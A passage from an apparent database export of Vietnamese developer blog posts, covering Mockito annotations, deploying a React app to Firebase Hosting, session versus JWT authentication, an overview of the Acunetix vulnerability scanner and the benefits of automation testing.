Mockito.when(mockedList.size()).thenReturn(1);\n    }\n}\n```\nHầu hết điều này xảy ra là do chúng ta quên bật các chú thích Mockito đúng cách ha\n\nVì vậy, chúng ta phải ghi nhớ rằng mỗi lần chúng ta muốn sử dụng các chú thích Mockito, chúng ta phải thực hiện thêm một bước và khởi tạo chúng như phần 2 của bài viết :grinning:.\n# 9. Summary\nMong rằng bài viết trên đã giúp bạn hiểu rõ hơn về các annotation trong mockito. :triumph:\n\nTài liệu tham khảo :\nhttps://www.baeldung.com/mockito-annotations	1. Overview\nNếu bạn từng dùng Mockito để unit testing trong Android nhưng còn chưa hiểu rõ về các annotation của nó thì bài viết này dành cho bạn rồi.\nTrong bài viết này mình sẽ trình bày về những annotations của thư viện Mockito : &#64;Mock, &#64;Spy, &#64;Captor, và &#64;InjectMocks.\n2. Enable Mockito Annotations\nTrước tiên - hãy xem cách cho phép sử dụng annotation với Mockito tests.\nĐể cho ...	{}	1	Annotation Mockito: @Mock, @Spy, @Captor and @InjectMocks	{mockito,android,unit-test}	0	f	2022-12-18 15:33:38.153+00	2022-12-18 15:33:38.153+00
31954	![](https://images.viblo.asia/7cb4e436-5e13-46b4-a0f7-3d555895ff58.png)\n# Firebase Hosting là gì ?\nFirebase hosting là một dịch vụ lưu trữ của Google cung cấp môi trường hosting cho static web một cách an toán, nhanh chóng, dễ dàng và hoàn toàn miễn phí .\n# Tại sao lại là Firebase Hosting ?\nHầu hết các dịch vụ web hosting sẽ tính phí hoặc sẽ chậm nếu chúng free , ngoài ra bạn phải trả một khoản phí cho chứng chỉ SSL để chuyển trang web của bạn thành một trang web an toàn với https\nLưu trữ trên Firebase là hoàn toàn miễn phí và theo mặc định nó cung cấp chứng chỉ SSL và nó được cung cấp một tốc độ truy cập đáng ấn tượng ở bất cứ đâu .\n# Deploy React app lên Firebase Hosting\n## Demo\nTrong bài viết này mình sẽ demo deploy một React app lên Firebase Hosting\n### React app\nMình sẽ sử dụng **create-react-app myapp** để tạo nhanh một react app \nTrước khi chạy create-react-app bạn sẽ cần **[install Node.js](https://nodejs.org/en/download/)** . Nếu đã install rồi thì chúng ta hãy tiếp tục với lệnh : \n```\nnpm install -g create-react-app\n```\nSau khi chạy hãy thử tạo ứng dụng với các lệnh :\n```\ncreate-react-app myapp\ncd myapp\nnpm start\n```\nBạn đã vừa tạo dược một React app rồi đấy :\n![](https://images.viblo.asia/66d2c93e-1e41-48ac-8f97-85df8dcd4bdf.png)\n\nSau đó ta sử dụng lệnh \n```\nnpm build\n```\nđể build code \n\n### Firebase:\nVào [firebase](https://firebase.google.com/) và đăng nhập với tài khoản Google rồi tạo một project ví dụ firebase-demo\n\n![](https://images.viblo.asia/aa06d0a0-dd2b-4df8-9f70-6e0a48127029.png)\n\nChọn Hosting \n\n![](https://images.viblo.asia/ee51bbc5-2f4a-4ad2-8706-753ab2cb7a51.png)\n\nNhấn Get started rồi install Firebase CLI bằng lệnh :\n```\nnpm install -g firebase-tools\n```\nĐăng nhập Google và khởi tạo\n```\nfirebase login\nfirebase init\n```\nSau khi init \n* Chọn Hosting \n* Chọn tên project vừa tạo khi nãy\n* **What do you want to use as your public directory?**  build\n* **Configure as a single-page app (rewrite all urls to /index.html)?** Yes\n* **File build/index.html already exists. Overwrite?** No\n\nChú thích :\n* What do you want to use as your public directory?  : ở đây yêu cầu chọn folder để render trang web . Với mặc định sẽ là thư mục tên là public nhưng chúng ta đã chạy npm build và tạo ra được thư mục build nên chọn file build\n* Configure as a single-page app (rewrite all urls to /index.html)? : có cấu hình ứng dụng như một single-page app không  ? chúng ta sẽ chọn YES như vậy web sẽ chạy vào index.html . Nếu chọn NO họ sẽ tự tạo ra 1 file build và bên trong chứa file 404.html và index.html\n* File build/index.html already exists. Overwrite? : do chúng ta đã build và có file index.html nên ở đây họ hỏi có Overwrite không ? Chúng ta sẽ chọn là NO\n\n![](https://images.viblo.asia/78151bf3-81ce-454f-b178-c6b356d84539.png)\n\nSau đó firebase sẽ tạo cho chúng ta 2 file là .firebaserc và firebase.json\n \nCuối cùng sử dụng lệnh \n```\nfirebase deploy\n```\n\nSau đó bạn sẽ đc trả lại Hosting URL\n\nNhư vậy là các bạn đã deploy thành công react app lên firebase hosting rồi đấy rất đơn giản phải không nào\n\nNếu muốn disable project đang chạy sử dụng lệnh \n```\nfirebase hosting:disable\n```\n\nNguồn tham khảo : https://firebase.google.com/docs/cli/	![](https://images.viblo.asia/7cb4e436-5e13-46b4-a0f7-3d555895ff58.png)\n\n\nFirebase Hosting là gì ?\nFirebase hosting là một dịch vụ lưu trữ của Google cung cấp môi trường hosting cho static web một cách an toán, nhanh chóng, dễ dàng và hoàn toàn miễn phí .\nTại sao lại là Firebase Hosting ?\nHầu hết các dịch vụ web hosting sẽ tính phí hoặc sẽ chậm nếu chúng free , ngoài ra bạn phải trả một khoản phí cho chứng chỉ SSL để chuyển trang web của bạn thành một trang web an t...	{https://images.viblo.asia/7cb4e436-5e13-46b4-a0f7-3d555895ff58.png,https://images.viblo.asia/66d2c93e-1e41-48ac-8f97-85df8dcd4bdf.png,https://images.viblo.asia/aa06d0a0-dd2b-4df8-9f70-6e0a48127029.png,https://images.viblo.asia/ee51bbc5-2f4a-4ad2-8706-753ab2cb7a51.png,https://images.viblo.asia/78151bf3-81ce-454f-b178-c6b356d84539.png}	1	Reactjs : Deploy react app trên Firebase Hosting hoàn toàn miễn phí	{reactjs,deploy,firebase}	0	f	2022-12-18 15:33:38.186+00	2022-12-18 15:33:38.186+00
31960	HTTP là Stateless. Tất cả các request đều là stateless. Vậy stateless là gì?\n# Stateless\n- Trong lập trình web, chúng ta có sự tương tác giữa client với server. Phần mềm gồm 2 thành phần chính: phần mềm và data. Như vậy, một phần mềm được thiết kế theo tương tác client – server thì phần nhiều tập lệnh sẽ nằm phía server. Client có nhiệm vụ gửi dữ liệu lên để xử lý sau đó nhận kết quả trả về.\nStateless là thiết kế không lưu dữ liệu của client trên server. Có nghĩa là sau khi client gửi dữ liệu lên server, server thực thi xong, trả kết quả thì “quan hệ” giữa client và server bị “cắt đứt” – server không lưu bất cứ dữ liệu gì của client. Như vậy, khái niệm “trạng thái” ở đây được hiểu là dữ liệu.\n\n\n-----\n\n\nTuy nhiên trong một số tình huống ta muốn lưu trữ dữ liệu, chẳng hạn trong một website bán hàng online, sau khi chúng ta đưa 1 sản phẩm vào trong giỏ hàng, chúng ta không muốn sản phẩm đó bị xoá khỏi giỏ hàng khi chuyển tới 1 trang mới. Trường hợp này chúng ta cần phải lưu những sản phẩm trong giỏ hàng bất kể khi điều hướng tói đường link khác trong website đó\n\n# Session Based Authentication\nTrong ***Session Based Authentication***, server sẽ tạo một session cho người dùng sau khi người dùng đăng nhập. Session ID sẽ được lưu ở cookie trong trình duyệt của người dùng. Trong khi người dùng vẫn còn đăng nhập, cookie sẽ gửi tiếp cùng với những request tiếp theo. Server có thể so sánh session ID lưu trữ ở cookie với session được lưu trong bộ nhớ để xác minh thông tin người dùng và gửi phản hồi với trạng thái tương ứng\n\n![](https://images.viblo.asia/fdd3546f-1ee6-4ea7-afa4-d07189532c30.png)\n\n*Luồng hoạt động của Session Based Authentication*\n\n# Token Based Authentication\n\nMột số trang website sử dụng JSON Web Token (JWT) thay thế cho việc xác thực bằng session.  Trong ***Token Based Authentication***, server tạo JWT một cách bí mật và gửi  JWT tới client. Client lưu JWT (thường là local storage) và thêm JWT vào header  với mọi request. Server sau đó sẽ xác thự JWT với mọi request từ client và trả về response.\n\n![](https://images.viblo.asia/17eeed29-52cf-4b4c-92b4-17c9adeb249a.png)\n\n*Luồng hoạt động của Token Based Authentication*\n\nSự khác biệt lớn nhất ở đây là user's state không lưu trên server, state được lưu trữ bên trong token ở client. Phần lớn các trang web hiện nay đều sử dụng JWT cho vệc xác thực do khả năng mở rộng cho các thiết bị di động.\n\n# Node Modules cho JWT\n[jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) là thư viện sử dụng để tạo JWT token trên server. Một khi người dùng đã đăng nhập, client sẽ truyền JWT token đằng sau header.authorization.bearer attribute.\n```\n{\n  method: "GET",\n  headers:{\n    "Authorization": "Bearer ${JWT_TOKEN}"\n  }\n}\n```\n[expres-jwt](https://github.com/auth0/express-jwt) là thư viện có thể sự dụng để xác thực JWT token bằng việc so sánh secret-code\n\n# Scalability - Khả năng mở rộng\n\n**Session based authentication:** vì sessions lưu trữ trên server, khả năng mở rộng là một vấn đề khi có một lượng lớn người dùng sử dụng hệ thống cùng 1 lúc\n\n**Token based authentication:** Không gặp vấn đề vì token được lưu trữ tại client\n\n# Multiple Device - Đa thiết bị\n\n**Session based authentication:** Cookies thường hoạt động đơn lẻ trên domain hoặc subdomain và chúng thường bị tắt đi bởi trình duyệt nếu họ làm việc trên cross-domain (3rd party cookies). Nó đặt ra vấn đề khi APIs được phục vụ từ các domain khác nhau với Mobile và Web device.\n\n**Token based authentication:** Không gặp vấn đề với cookies vì JWT được thêm vào với mỗi request header.\n\nToken Based Authentication sử dụng JWT là phương pháp được khuyến khích hơn trong các website. Một nhược điểm với JWT là kích thước của JWT lớn hơn nhiều so với Session ID được lưu trữ trong cookie vì JWT chứa nhiều thông tin của người dùng hơn. Cần đảm bạo rằng chỉ có thông tin cần thiết được đưa vào JWT và những thông tin quan trọng nên được bỏ qua để ngăn chặn các cuộc tấn công XSS.\n\n# Tư liệu tham khảo:\n\n1.  [https://medium.com/@sherryhsu/session-vs-token-based-authentication-11a6c5ac45e4](https://medium.com/@sherryhsu/session-vs-token-based-authentication-11a6c5ac45e4)\n2.  [https://ponyfoo.com/articles/json-web-tokens-vs-session-cookies](https://ponyfoo.com/articles/json-web-tokens-vs-session-cookies)\n3.  [Token Based Authentication -- Implementation Demonstration](https://www.w3.org/2001/sw/Europe/events/foaf-galway/papers/fp/token_based_authentication/)	HTTP là Stateless. Tất cả các request đều là stateless. Vậy stateless là gì?\nStateless\n- Trong lập trình web, chúng ta có sự tương tác giữa client với server. Phần mềm gồm 2 thành phần chính: phần mềm và data. Như vậy, một phần mềm được thiết kế theo tương tác client – server thì phần nhiều tập lệnh sẽ nằm phía server. Client có nhiệm vụ gửi dữ liệu lên để xử lý sau đó nhận kết quả trả về.\nStat...	{https://images.viblo.asia/fdd3546f-1ee6-4ea7-afa4-d07189532c30.png,https://images.viblo.asia/17eeed29-52cf-4b4c-92b4-17c9adeb249a.png}	1	Session và Token Based Authentication	{jwt,access-token,http,web,sessions}	0	f	2022-12-18 15:33:38.213+00	2022-12-18 15:33:38.213+00
31957	**Trong việc pentest hay exploit một ứng dụng bên cạnh dựa trên cái đầu của người thực hiện thì việc sử dụng một công cụ dò quét tốt cũng không thể thiếu. Đối với nhiều lỗ hổng phổ biến thì lượng payload để khai thác một hacker nắm giữ có thể không nhiều được như các công cụ, ví dụ như với riêng lỗ hổng SQL Injection thì SQL MAP có được một lượng payload khổng lồ mà hiếm có người khai thác nào có được nhiều hơn. Và trong bài viết này sẽ giới thiệu với các bạn một công cụ để thực hiện việc pentest Web có thể sẽ được thực hiện dễ dàng hơn – Acunetix.**\n\nAcunetix Web Vulnerbility Scanner là một công cụ kiểm tra bảo mật ứng dụng web tự động kiểm tra các ứng dụng web để tìm kiếm lỗ hổng bảo mật như SQL Injection, hay Cross-Site Scripting (XSS),... Nói chung, Acunetix quét bất kỳ trang web hoặc ứng dụng web nào có thể truy cập thông qua trình duyệt web và sử dụng giao thức HTTP / HTTPS.\n\n# Acunetix hoạt động như thế nào?\nTheo document của Acunetix thì công cụ này được hoạt động theo luồng chính sau:\n1.  Acunetix DeepScan phân tích toàn bộ trang web bằng cách truy vết tất cả các liên\nkết trên trang web, bao gồm các liên kết được xây dựng động bằng JavaScript và\ncác liên kết được tìm thấy trong tệp robots.txt và sitemap.xml (nếu có). Kết quả là\nmột bản đồ của trang web, mà Acunetix sẽ sử dụng để khởi chạy các kiểm tra được\nnhắm mục tiêu đối với từng phần của trang web.\n\n![](https://images.viblo.asia/4c039f5b-25fb-4bc9-8117-7e20ab3cb6b0.png)\n\n2.  Nếu Acunetix AcuSensor Technology (kỹ thuật hỗ trợ dò quét mã nguồn của\nAcunetix) được cài đặt, bộ thu thập (sensor) sẽ lấy danh sách tất cả các tệp có trong\nthư mục ứng dụng web và thêm các tệp mà trình thu thập thông tin không tìm thấy\nvào đầu ra của trình thu thập thông tin. Các tệp như vậy thường không được trình\nthu thập thông tin phát hiện vì chúng không thể truy cập được từ máy chủ web\nhoặc không được liên kết thông qua trang web chẳng hạn như web.config.\n3.  Sau quá trình thu thập dữ liệu, máy quét sẽ giả lập như một hacker, tự động khởi\nchạy một loạt các kiểm tra lỗ hổng trên mỗi trang được tìm thấy. Acunetix cũng\nphân tích từng trang cho những nơi có thể nhập dữ liệu và sau đó thử tất cả khả\nnăng đầu vào độc hại. Đây là Giai đoạn quét tự động. Nếu AcuSensor Technology\nđược bật, các mẫu kiểm tra lỗ hổng bổ sung sẽ được đưa ra đối với trang web.\n\n![](https://images.viblo.asia/a08a2d50-7457-4804-8128-e7dacf487f50.png)\n\n4. Các lỗ hổng được xác định được hiển thị trong Scan Result. Các thông tin về lỗ\nhổng như data trong một request POST được sử dụng, mục bị ảnh hưởng, phản hồi HTTP của máy chủ và các thông tin khác được cung cấp chi tiết trong mỗi cảnh báo lỗ hổng. Các thông tin này trong hầu hết trường hợp có thể giúp cho người quản trị có thể dựng lại kịch bản tấn công và dễ dàng vá lỗi hơn, ví dụ như trong lỗ hổng sau của một website.\n\n![](https://images.viblo.asia/bc315f7c-6fdd-42b7-a845-6875780fbdb2.jpg)\n\n5. Nếu AcuSensor Technology được sử dụng, các chi tiết như số dòng mã nguồn dẫn đến lỗ hổng được liệt kê. Các khuyến nghị về cách khắc phục lỗ hổng cũng được hiển thị\n6. Sau khi việc dò quét hoàn tất, Acunetix có thể tạo ra các báo cáo như  Executive Summary, Developer report hay các báo cáo tuân theo các tiêu chuẩn PCI DSS hoặc ISO 270001\n#  Đánh giá\nCuối cùng của bài viết mình sẽ đưa ra một số ưu điểm và nhược điểm mà trong quá trình sử dụng mình nhận thấy.\n\n### 1. Ưu điểm\n\n* Giao diện website trực quan, dễ sử dụng.\n* Có lượng mẫu thử khổng lồ.\n* Có kịch bản khai thác tốt, hỗ trợ phát hiện được hầu hết các lỗ hổng web phổ biến.\n* Báo cáo cho các lỗ hổng rất chi tiết, cụ thể.\n* Giữ lại lịch sử, kết quả rò quét.\n\n### 2. Nhược điểm\n* Trong quá trình quét rất tốn RAM và bộ nhớ.\n* Khi quét trang web lớn tốn nhiều thời gian, chưa hỗ trợ chức năng tạm dừng, phải chờ đến khi quét xong.\n* Là công cụ có phí, không công bố mã nguồn.\n* Khó để có thể nghiên cứu sâu, tận dụng nhưng module có sẵn của nó để hỗ trợ cho việc xây dựng một công cụ của bản thân.	Trong việc pentest hay exploit một ứng dụng bên cạnh dựa trên cái đầu của người thực hiện thì việc sử dụng một công cụ dò quét tốt cũng không thể thiếu. Đối với nhiều lỗ hổng phổ biến thì lượng payload để khai thác một hacker nắm giữ có thể không nhiều được như các công cụ, ví dụ như với riêng lỗ hổng SQL Injection thì SQL MAP có được một lượng payload khổng lồ mà hiếm có người khai thác nào có...	{https://images.viblo.asia/4c039f5b-25fb-4bc9-8117-7e20ab3cb6b0.png,https://images.viblo.asia/a08a2d50-7457-4804-8128-e7dacf487f50.png,https://images.viblo.asia/bc315f7c-6fdd-42b7-a845-6875780fbdb2.jpg}	1	Giới thiệu công cụ dò quét lỗ hổng Acunetix	{web-application-security-testing}	0	f	2022-12-18 15:33:38.232+00	2022-12-18 15:33:38.232+00
31913	Câu chuyện bắt đầu bằng việc trong những lần gặp gỡ với nhóm bạn 4 người của mình thì có tới 3/4 là làm tester. Không phải khi nào bọn mình cũng nói về chuyện công việc nhưng cũng không ít lần các bạn nói chuyện về test này, test kia, test case hay automation test. Thôi thì không chuyên cái mình làm nên chỉ nghe và về thử tìm xem các bạn nói gì vậy :smiley: . Bài này mình sẽ thử tìm hiểu xem automation test là gì và khả năng áp dụng của nó vào trong quá trình phát triển của sản phẩm như nào. Có gì sai sót mong các bạn tester chân chính bỏ qua :sob: .\n\nAutomation test là một phần quan trọng của quá trình phát triển để xây dựng nên một phần mềm mạnh mẽ và đáp ứng yêu cầu người dùng. Tuy nhiên, không phải công ty nào, dự án nào cũng đánh giá mức độ quan trọng cũng như áp dùng nó vào dự án thực tế. Nó có thể bị đánh giá là không cần thiết hoặc quá cồng kềnh. \n\n# Automation test là gì?\nAutomation test là là một quy trình phát triển bao gồm các công cụ để thực hiện các test case được xác định trước đối với một phần mềm dự trên một sự kiện. Những kiểm thử này thường liên quan đến các hoạt động lặp đi lặp lại cả và bản chất và kết quả của chúng.\n\nCó rất nhiều cách khác nhau để các developer có thể kiểm tra code do họ viết. Hầu hết thời gian, các kiểm thử này được tiến hành thủ công (manual test). Automation test khác biệt bởi nó có một quy trình, hệ thống hay dịch vụ tiến hành các kiểm thử này để phản hồi  với việc các developer thay đổi code.\n\nBản chất của việc automation test cho các developer là tương đối rõ ràng: thực hiện các công việc được xác định trước (test) đối với một tập hợp các điều kiện tiên quyết và kết quả mong muốn dựa trên một sự kiện được kích hoạt (thay đổi code).\n\nVới mô tả như trên ta có thể thấy là có vẻ đơn giản, nhưng trong thực tế thì việc tích hợp automation test vào quy trình làm việc của developer có thể mang nhiều sắc thái hơn. Có nhiều lợi ích liên quan đến automation test, tuy nhiên đi kèm với nó chính là các chi phí liên quan.\n\n# Automation test trong thực tế cho các developer\nTheo một các thông thường mà các developer vẫn đang làm thì chúng ta muốn kiểm tra đến các khía cạnh cụ thể của một ứng dụng. Có thể nói đến như là framework và các API. Nó có thể được kiểm tra thông qua cách chúng ta thực hiện unit test. Unit test thông báo cho các developer khi có sự thay đổi trong một đơn vị ảnh hưởng đến chức năng của đơn vị khác. Các framework có unit test thường được triển khai bằng cách sử dụng cùng một code được sử dụng bởi hệ thống được kiểm tra.\n\nCó một vấn đề cần quan tâm là chi phí cho việc liên tục kiểm soát unit test đi cùng với việc thay đổi code liên tục. Ta có thể dành nhiều thời gian để viết và có các yêu cầu khắt khe để cho ta có thể cập nhật liên tục với sự thay đổi code. Tuy nhiên, chi phí đó nên được coi là một khoản đầu tư chính đáng vì sự hoạt động như mong đợi của code.\n\nAutomation test có thể thúc đẩy các bài kiểm tra unit test như một phần của quá trình phát triển. Ví dụ, một IDE có thể chạy các kiểm thử này sau khi quá trình xây dựng ứng dụng được hoàn thành. Hoặc trong một kịch bản phức tạp hơn, hệ thống có thể được thiết lập để chạy chạy unit test theo lịch trình có sẵn. Dù sử dụng cấu hình nào, sẽ có những kết quả đạt được thông qua automation test loại này. \n\nMột khía cạnh khác của kiểm thử là mục tiêu nhắm đến UI. Điều này tương tự ở một số khía cạnh so với unit test theo nghĩa là kiểm thử UI có thể nhỏ và tập trung vào các khía cạnh cụ thể của một ứng dụng. Tuy nhiên, nó có sự khác biệt ở việc chạy các kiểm thử này với các phần của UI có trong thời gian chạy. Điều này đòi hỏi cơ sở hạ tầng của hệ thống hỗ trợ. Nó cũng đòi hỏi một khuôn khổ để làm chủ các bài kiểm thử này. Các framework cung cấp các khối xây dựng cần thiết để kiểm tra UI. Tuy nhiên, chúng cũng bị giới hạn trong một môi trường tương tự như unit test.\n\nMột số giải pháp cung cấp phương tiện để ghi lại sự tương tác của người dùng với ứng dụng như một phương tiện để thực hiện các kiểm thử này. Chúng hoạt động như một trình tạo mã các bài kiểm tra bằng cách xem tất cả các tương tác mà người dùng có với một ứng dụng và sử dụng nó để làm các bài kiểm thử. Các kiểm thử này có thể được sửa đổi để phù hợp với các yêu cầu khác nhau.\n\nCó rất nhiều framework để kiểm thử đối với các đơn vị có sẵn. Mỗi framework có giá trị riêng và việc lựa chọn loại này tùy thuộc vào tính năng cần thiết và trình độ chuyên môn của nhóm phát triển. Các framework này cung cấp cơ sở hạ tầng và các chức năng cần thiết để kiểm tra code.\n\n# Một số tiêu chí cho Automation test\nCó nhiều giải pháp và sản phẩm hiện tại hỗ trợ cho automation test. Một số tích hợp trực tiếp và môi trường phát triển với cơ sở hạ tầng hỗ trợ ít hoặc không có. Trong khi một số khác có thể yêu cầu cấu hình phức tạp hơn. Một số lại được xây dựng để hỗ trợ các nhà phát triển cá nhân, trong khi một số lại được xây dựng theo quy mô để hỗ trợ các nhóm. Việc bạn lựa chọn loại hình nào thì tất nhiên là do bạn, tuy nhiên hãy xem xét các tiêu chí sau:\n* Ứng dụng hay hệ thống bạn đang kiểm thử thuộc loại nào? Ví dụ là một ứng dụng máy tính hay một trang web với các tích hợp hệ thống phụ trợ? Giải pháp automation test của bạn có nhắm mục tiêu vào chúng?\n* Cơ sở hạ tầng có khả năng hỗ trợ automation test hay không?\n* Làm thế nào để tích hợp các bài kiểm thử vào automation test? Quản lý kiểm thử và bảo trì chịu một chi phí đáng kể liên quan đến các giải pháp automation test.\n* Giải pháp automation test của bạn có tích hợp với các công cụ và môi trường phát triển hiện có của bạn không?\n* Những khả năng báo cáo có sẵn từ giải pháp automation test của bạn? Làm thế nào để bạn biết nếu bài kiểm thử của bạn đã pass hay fail? Bạn có thể được một cái nhìn chi tiết về quá trình thực hiện các bài kiểm thử để có thể quan sát tiến trình theo thời gian?\n* Làm thế nào để các bài kiểm thử có thể chạy qua giải pháp automation test của bạn? Có phải chúng được kích hoạt dựa trên các sự kiện nhất định? Chúng có thể được lên lịch để chạy vào một thời điểm nhất định trong này? Một số lần chạy kiểm thử có thể mất nhiều thời gian để thực hiện.\n\nViệc trả lời được những câu hỏi trên sẽ giúp bạn hướng tới một giải pháp automation test phù hợp đối với hệ thống bạn đang thực hiện.\n\n# Nên hay không?\nBằng chứng cho việc các developer sử dụng và hỗ trợ automation test là tương đối rõ ràng. Nó có tác động mạnh mẽ đến năng suất của developer khi được tích hợp đúng vào quy trình làm việc. Mặc dù có các chi phí liên quan đến automation test. Chúng được khấu  hao trong suốt thời gian của dự án và thậm chí nó có thể giúp bạn tiết kiệm thời gian và tiền bạc trong thời gian dài.\n\nViệc quyết định kết hợp automation test sẽ dựa trên phân tích chi tiết về các yêu cầu và quy trình phát triển để xây dựng nên phần mềm. Cần một sự tiếp cận đo lường khi đánh giá các lựa chọn. Triển khai chúng một cách cô lập, sử dụng chúng trong một thời gian và xem xét các tác động tích cực/ tiêu cực mà chúng cho bạn và nhóm của bạn.\n\n# Kết luận\nĐây là bài viết tương đối tổng quan về vai trò cũng như đánh giá về vai trò của automation test đối với một ứng, một phần mềm. Chúng ta không phải khi nào cũng áp đặt cần sử dụng cái này cái kia cho toàn bộ dự án. Cần đánh giá về mức độ cần thiết và khả năng bào trì đối với việc áp dụng automation test. Đối với những hành động mang tính cố định có ít sự thay đổi nhiều hay có các điều kiện liên quan nhiều đến hệ thống thì việc sử dụng automation test có thể mang lại hiệu quả cao.\n\nỞ bài tiếp theo mình sẽ tìm hiểu chi tiết về các công cụ sử dụng cho automation test và chi tiết hơn về quy trình thực hiện nó. Với một người ngoại đạo "test" mong sẽ bớt gạch đá nếu có sai lầm nào trong nội dung bài viết.	Câu chuyện bắt đầu bằng việc trong những lần gặp gỡ với nhóm bạn 4 người của mình thì có tới 3/4 là làm tester. Không phải khi nào bọn mình cũng nói về chuyện công việc nhưng cũng không ít lần các bạn nói chuyện về test này, test kia, test case hay automation test. Thôi thì không chuyên cái mình làm nên chỉ nghe và về thử tìm xem các bạn nói gì vậy :smiley: . Bài này mình sẽ thử tìm hiểu xem au...	{}	1	Đi tìm hiểu Automation Test với một Developer	{developer,automation-test}	0	f	2022-12-18 15:33:38.284+00	2022-12-18 15:33:38.284+00
31463	# **Automation Testing là gì?**\nAutomation testing là một quá trình kiểm thử gồm một tool tự động thực hiện các trường hợp kiểm thử và các hành động được xác định trước trên một ứng dụng phần mềm. Tool sẽ thực hiện kiểm tra lấy kết quả thực tế và so sánh với kết quả mong muốn để tạo ra báo cáo kết quả kiểm thử chi tiết.\n\nAutomation Testing đòi hỏi một sự đầu tư đáng kể về tài nguyên và tiền bạc, do đó cần phải xác định khi nào nên thực hiện automation testing, phạm vi và tool automation. Lên kế hoạch chuẩn bị tốt sẽ giúp chúng ta tránh khỏi phát sinh chi phí cao. \n\n# **Lợi ích của Automation Testing**\n## **1. Lên kế hoạch thực hiện kiểm thử 24/7**\n\nMột trong những lợi ích chính của automation testing so với manual testong là tính linh hoạt để thực hiện kiểm thử, bất cứ lúc nào, từ bất cứ nơi nào trên thế giới. Để thực hiện manual testing, bạn cần một máy tính làm việc để thực hiện kiểm thử một ứng dụng web. Bạn không thể mang máy tính, laptop đi khắp mọi nơi. Ngoài ra, nếu ai đó yêu cầu bạn thực hiện kiểm thử vào lúc 3:00 sáng sau một ngày dài làm việc, tôi chắc chắn rằng tâm trạng của bạn lúc đó không hề dễ chịu.\n\nĐây là lý do tại sao automation testing tốt hơn manual testing, vì trong các trường hợp như vậy, bạn có thể lên kế hoạch thực hiện các trường hợp kiểm thử vào bất kỳ thời gian nào trong ngày, tại bất kỳ vị trí nào và phân tích kết quả kiểm thử bằng các báo cáo được tạo trên cơ sở bộ dữ liệu kiểm thử của bạn.\n\n## **2. Dễ dàng Regression Testing**\n\nManual testing tốn nhiều thời gian vì mỗi lần deploy trên môi trường production, tester phải chạy lại một bộ các trường hợp kiểm thử tương tự trong cùng khoảng thời gian để đảm bảo rằng lỗi đã được fix. Kiểm thử hồi quy là một trong những vấn đề đau đầu đối với team dự án. Thực hiện cùng một hành động kiểm thử nhiều lần, không chỉ mất nhiều thời gian hơn mà còn làm giảm hiệu quả của người kiểm thử.\n\nViệc thực hiện kiểm tra hồi quy thủ công tốn rất nhiều thời gian và dẫn đến các vấn đề sau:\n→ Thực hiện toàn bộ trường hợp kiểm thử hồi quy sẽ tạo ra tắc nghẽn trong chu kỳ phát triển, khiến nó không linh hoạt.\n→ Kiểm thử hồi quy thủ công không được thực hiện triệt để mỗi khi phần mềm được cập nhật do các hạn chế về thời gian.\n→ Không chắc chắn về việc các trường hợp kiểm thử được thực hiện theo cùng một cách mỗi lần.\n\nĐây là lý do tại sao automation testing lý tưởng để thực hiện kiểm thử hồi quy. Như đã nói ở phần trước, các bài kiểm thử tự động giống như những robot không bao giờ ngủ. Do đó, đội dự án có nhiều thời gian hơn để thực hiện bộ kiểm thử hồi quy. Ngoài ra, chỉ cần một lần đầu tư thời gian vào việc xây dựng một trường hợp kiểm thử tự động sẽ mang đến rấ nhiều lợi ích lớn cho chúng ta trong tương lai.\n\n## **3. Tái sử dụng luôn làm bạn cảm thấy tốt hơn!**\n\nMột lợi ích lớn khác của việc kiểm thử tự động là khả năng sử dụng lại các tập lệnh kiểm thử. Viết các trường hợp kiểm thử hiệu quả đòi hỏi rất nhiều thời gian và công sức, và để viết các trường hợp kiểm thử tương tự một lần nữa có thể khiến một người kiệt sức về tinh thần. Đây là lý do tại sao kiểm thử tự động tốt hơn so với kiểm thử thủ công. Khi bạn thực hiện kiểm thử tự động, bạn chỉ cần viết kịch bản kiểm thử một lần và có thể sử dụng lại bao nhiêu lần tùy thích.\n\nChúng ta hãy nhìn vào điểm này từ quan điểm kiểm thử trình duyệt chéo. Khi bạn thực hiện kiểm thử trình duyệt chéo, bạn có thể cần phải viết tập lệnh kiểm thử hoặc trường hợp kiểm thử mỗi lần khi thực hiện kiểm thử một ứng dụng trên các hệ điều hành hoặc thiết bị khác nhau. Nghe có vẻ mệt mỏi, phải không?\n\nTuy nhiên, các kịch bản kiểm thử tự động có thể tái sử dụng; bạn không cần viết các tập lệnh mới ngay cả khi phiên bản hệ điều hành trên thiết bị thay đổi. Bạn có thể thực hiện kiểm thử tương tự lần nữa mà không quên bất kỳ bước nào. \n\nVới các công cụ kiểm thử tự động, tập lệnh kiểm thử có thể được sử dụng lại nhiều lần khi bạn cần, và tiết kiệm cả thời gian và công sức cho bạn.\n\n## **4. Báo cáo kiểm thử giúp bạn phân tích hàng trăm trường hợp kiểm thử dễ dàng!**\n\nTrong trường hợp kiểm thử thủ công, tester phải báo cáo cho nhau bằng tay để biết có bao nhiêu test scripts đã được viết và bao nhiêu lỗi đã được sửa. Toàn bộ quá trình rất cồng kềnh và dẫn đến sự phụ thuộc lẫn nhau. \n\nMặt khác, test automation có thể giúp người kiểm thử xem người  khác đã làm gì, kịch bản nào đã được viết, tất cả các thử nghiệm khác đã thực hiện và những lỗi nào được phát hiện và sửa chữa với sự trợ giúp của các báo cáo rõ ràng của automation testing.\n\n## **5. Khả năng thực hiện kiểm thử trên nhiều nền tảng song song**\n\nKhi phát triển một trang web, điều cần thiết là đảm bảo khả năng tương thích trên các trình duyệt, phần cứng, hệ điều hành, mạng và thiết bị di động khác nhau. \n\nThực hiện kiểm thử khả năng tương thích trình duyệt yêu cầu tạo ra vô số trường hợp kiểm thử. Đặc biệt, khi xem xét số lượng phiên bản trình duyệt có sẵn trên thị trường, việc thực hiện kiểm thử thủ công qua hàng trăm sự kết hợp trình duyệt và hệ điều hành có thể dẫn đến trì hoãn quá trình phát hành phần mềm.\n\nKiểm thử tự động cho phép tester thực hiện kiểm thử trên hàng ngàn trình duyệt, hệ điều hành và thiết bị một cách nhanh chóng và đồng thời.\n\n## **6. Tiết kiệm rất nhiều thời gian!**\n\nKhông nghi ngờ gì, kiểm thử tự động tăng tốc chu kỳ kiểm thử của bạn, giúp bạn thực hiện các trường hợp kiểm thử lặp lại, đơn điệu hàng ngày. Cho phép bạn có thêm thời gian để đưa ra các tình huống kiểm thử tốt hơn. Các công ty phải chịu tổn thất lớn do không thể cung cấp các phiên bản không có lỗi một cách nhanh chóng. Kiểm thử tự động không thể cung cấp một phiên bản phát hành không có lỗi, nhưng chắc chắn sẽ giúp bạn tiết kiệm thời 